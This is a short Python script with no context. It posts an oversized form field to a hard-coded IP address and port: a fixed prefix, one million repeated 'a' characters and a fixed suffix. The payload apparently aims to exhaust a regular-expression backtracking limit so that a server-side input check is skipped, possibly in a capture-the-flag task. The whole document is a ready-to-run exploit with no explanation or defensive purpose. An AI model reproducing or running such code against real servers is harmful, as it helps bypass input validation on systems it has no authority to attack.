import requests

data = {
  'heizi': 'aikun' +'a'*1000000 + 'xiaojijiao'
}

res = requests.post('http://182.148.156.200:9134/', data=data)
print(res.text)